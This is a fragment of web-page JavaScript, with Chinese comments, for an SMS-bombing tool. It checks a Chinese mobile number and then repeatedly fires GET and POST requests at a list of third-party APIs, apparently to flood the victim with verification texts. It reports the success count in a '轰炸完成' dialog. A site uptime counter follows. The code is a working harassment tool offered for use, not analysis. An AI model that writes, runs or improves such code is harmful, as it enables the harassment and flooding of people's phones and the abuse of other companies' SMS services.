        // 发送POST和GET请求的函数
       function sendRequests() {
    // 获取输入值
    const phoneNumber = document.getElementById('phoneNumber').value;
    const times = parseInt(document.getElementById('times').value, 10);

    if (!phoneNumber || !/^[1][3-9][0-9]{9}$/.test(phoneNumber)) {
    alert("请输入正确的11位中国手机号！");
    return;
    }

    if (!times || isNaN(times) || times <= 0) {
    alert("请输入≥1的正确轰炸次数！");
    return;
    }

    let successCount = 0;  // 请求成功的次数
    let failureCount = 0;  // 请求失败的次数
    let totalRequests = 0; // 总请求次数
    let completedRequests = 0; // 已完成的请求数
    
    setTimeout(() => {
        alert('轰炸成功！');
    }, 25); // 显示弹窗

    // 用一个数组来保存所有请求的Promise
    const requestPromises = [];

    // 循环执行次数
    for (let i = 0; i < times; i++) {
        // 遍历所有的API URL，并为每个API发送不同的数据
        apiRequests.forEach((apiRequest) => {
            const requestData = apiRequest.data(phoneNumber, i + 1);
            totalRequests++; // 每发送一个请求，增加总请求次数

            let requestPromise;

            if (apiRequest.method && apiRequest.method === 'GET') {
                // 对于GET请求，拼接URL
                const urlWithParams = `${apiRequest.url}?${requestData}`;
                requestPromise = fetch(urlWithParams, {
                    method: 'GET',
                    headers: apiRequest.headers()
                }).then(response => {
                    if (response.ok) {
                        successCount++; // 请求成功
                    } else {
                        failureCount++; // 请求失败
                    }
                }).catch(error => {
                    failureCount++; // 请求失败
                    console.error(`GET 请求失败: ${apiRequest.url}`, error);
                });
            } else if (apiRequest.method && apiRequest.method === 'POST_JSON') {
                // 发送POST请求（JSON格式）
                requestPromise = fetch(apiRequest.url, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(requestData)
                }).then(response => {
                    if (response.ok) {
                        successCount++; // 请求成功
                    } else {
                        failureCount++; // 请求失败
                    }
                }).catch(error => {
                    failureCount++; // 请求失败
                    console.error(`POST_JSON 请求失败: ${apiRequest.url}`, error);
                });
            } else if (apiRequest.method && apiRequest.method === 'POST_FORM') {
                // 发送POST请求（表单格式）
                const formData = new URLSearchParams();
                for (const key in requestData) {
                    if (requestData.hasOwnProperty(key)) {
                        formData.append(key, requestData[key]);
                    }
                }

                requestPromise = fetch(apiRequest.url, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded'
                    },
                    body: formData.toString()
                }).then(response => {
                    if (response.ok) {
                        successCount++; // 请求成功
                    } else {
                        failureCount++; // 请求失败
                    }
                }).catch(error => {
                    failureCount++; // 请求失败
                    console.error(`POST_FORM 请求失败: ${apiRequest.url}`, error);
                });
            } else {
                // 默认的POST请求（处理其他未知的POST请求类型）
                requestPromise = fetch(apiRequest.url, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(requestData)
                }).then(response => {
                    if (response.ok) {
                        successCount++; // 请求成功
                    } else {
                        failureCount++; // 请求失败
                    }
                }).catch(error => {
                    failureCount++; // 请求失败
                    console.error(`POST 请求失败: ${apiRequest.url}`, error);
                });
            }

            // 将每个请求的Promise加入到数组中
            requestPromises.push(requestPromise);
        });
    }

    // 等待所有请求完成后，显示结果
    Promise.all(requestPromises).finally(() => {
        // 所有请求完成后，弹出统计信息
        var userResponse = confirm(`轰炸完成！\n成功：${successCount} 条\n失败：${failureCount} 条\nCopyright 正义社工©`);
        if (userResponse) {
            // 用户点击了“确定”
        } else {
            // 用户点击了“取消”
        }
    });
}

    </script>
    
    本站已安全运行:<span id=span_dt_dt style="color: #2F889A;"></span>
    <script language=javascript>
    function show_date_time(){
    window.setTimeout("show_date_time()", 1000);
    BirthDay=new Date("10/26/2025 00:00:01");
    today=new Date();
    timeold=(today.getTime()-BirthDay.getTime());
    sectimeold=timeold/1000
    secondsold=Math.floor(sectimeold);
    msPerDay=24*60*60*1000
    e_daysold=timeold/msPerDay
    daysold=Math.floor(e_daysold);
    e_hrsold=(e_daysold-daysold)*24;
    hrsold=Math.floor(e_hrsold);
    e_minsold=(e_hrsold-hrsold)*60;
    minsold=Math.floor((e_hrsold-hrsold)*60);
    seconds=Math.floor((e_minsold-minsold)*60);
    span_dt_dt.innerHTML='<font style=color:#FF0000>'+daysold+'</font> 天 <font style=color:#FF0000>'+hrsold+'</font> 时 <font style=color:#FF0000>'+minsold+'</font> 分 <font style=color:#FF0000>'+seconds+'</font> 秒';
}
show_date_time();
</script>
